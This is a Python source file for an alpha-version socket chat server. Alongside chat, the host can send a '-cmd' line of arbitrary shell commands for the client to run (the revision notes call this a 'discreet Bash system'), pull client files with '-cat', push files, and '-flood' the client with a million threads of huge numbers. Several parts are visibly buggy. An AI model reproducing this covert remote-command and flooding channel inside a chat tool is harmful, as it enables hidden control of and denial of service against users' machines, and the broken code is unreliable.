'''
Python Script
Program Version ALPHA 1.6.7 

SocketServer, a new and better socket server.

Recent Revisions:
Bug fixes for discreet Bash system.
Maybe fix double line/tn thing? That would be great!

Created by Yovel Key-Cohen
'''

import socket
import sys
from _thread import *
import random
import time
import os
from tkinter import *

text=''

local_user='<<'+input('Please enter a username for yourself:\n')+'>>'
#local_user = '<<HOST>>'

host = ''
port = 37377
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    s.bind((host,port))
except socket.error as e:
    print(str(e))
    while port == 37377:
        port = random.randint(37000,37500)
    print('Trying port '+str(port))
    s.bind((host,port))

i=1

def flood(null):
    n=1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    eN=n**10
    conn.send(str.encode(str(random.randint(eN,2*eN))))


s.listen(2)
print('Waiting for a connection on port '+str(port)+'...')
def chat(conn,TALK_NOW=False):
    conn.send(str.encode('CONNECTED\n'))
    global i
    if i == 1:
        conn.send(str.encode('-\nWelcome. Please enter a username.\n'))
        try:
            u=(conn.recv(2048)).decode('UTF-8')
            if u[-2:]=='\n':
                CU = ('<')+u[0:-2]+('> ')
            else:
                CU = ('<')+u[0:]+('> ')
        except:
            print('An error occurred while the client was entering a username.')
            conn.close()
            s.close()
            print('The user disconnected before entering a name.')
        print('User '+CU+'has joined the chat!')
        conn.send(str.encode('Welcome again! Your username has been accepted. Please wait until the host gives you permission to talk (otherwise it breaks).\n'))
    else:
        conn.send(str.encode("You are another user. Type messages ONLY IF THE OTHER USER HASN'T SAID ANYTHING!!! \nCheers!\n"))
        print('There is another user.')
    while True:
        if TALK_NOW==True:
            try:
                
#               //////////////////////
#
#               Client Input/Output
#
#               \\\\\\\\\\\\\\\\\\\\\\
                
                conn.send(str.encode('You may say '+str(t_int)+' things. You may use '+str(t_int)+' lines.\nIf you are on Windows, you may only send a message of '+str(t_int)+' characters on a one character per message basis.\nOnce you use your last line, DO NOT TALK UNTIL IT SAYS YOU CAN!!!\n'))
                print('\nYou have allowed '+CU+' to talk for '+str(t_int)+' lines.\n')
                for i in range(t_int):
                    try: 
                        data = (conn.recv(2048)).decode('UTF-8')
                        print(CU+'  '+data)
                    except:
                        print('Illegal useage!\n')
                        conn.send(str.encode('Illegal characters!!! Stop typing until you are allowed again!!!\n'))
 #                   msg = (CU+' '+(data)+'\n')
                    if not data:
                        break
 #                   print(msg)
                conn.send(str.encode('\nYou may no longer talk. Please wait until the host says lets you, otherwise it will break!\n\n'))
                print('\nYou may talk now.\n')
            except:
                print('The user has disconnected. Shutting down...')
                conn.close()
                s.close()
        reply = input()
        if reply=='-send_file':
            conn.send(str.encode(input('Enter the name for the file...\n')))
            filename=input('Enter the file path...\n')
            file=open(filename,'r')
            conn.send(str.encode(file.read()))
        if reply[:4]=='-cmd':
            conn.send(str.encode('-cmd'))
            shell=input('Enter a command or series of commands to execute:\n')
            conn.send(str.encode(shell))
            print('Continue talking...')
        elif reply[:6]=='-flood':
            for i in range(1000000):
                start_new_thread(flood,(None,))
            conn.send(str.encode('\n'))
        elif reply[:4]=='-cat':
            dir_=input('Beginning from the home folder, what file would you like to read? (enter directory path)')
            conn.send(str.encode('-ls'))
            out=conn.recv(8192)
            print('\nThe file reads:\n'+out+'\n\n')



            #Server input


            
        elif reply[:3]!='-tn':
            TALK_NOW=False
#            conn.send(str.encode(local_user+'  '+reply+'\n'))
            conn.send(str.encode(reply))
            print('CLIENT: '+local_user+'  '+reply+'\n')
#            rmsg=(conn.recv(2048)).decode('UTF-8')
#            print(rmsg)
        else:
            try:
                TALK_NOW=True
                conn.send(str.encode(local_user+'  '+'tn'+'\n'))
                t_int=int(input('How many lines can he speak for?\n'))
                conn.send(str.encode(local_user+'  '+str(t_int)+'\n'))
            except:
                print('The user has disconnected.\n')
                conn.close()
                s.close()
#     conn.send(str.encode('You have broken the program. Shutting down...'))
#     time.sleep(2)
#     conn.close()

while True:
    conn, addr = s.accept()
    print('Connected to: '+str(addr[0])+':'+str(addr[1]))
    #chat(conn)
    
    start_new_thread(chat,(conn,))
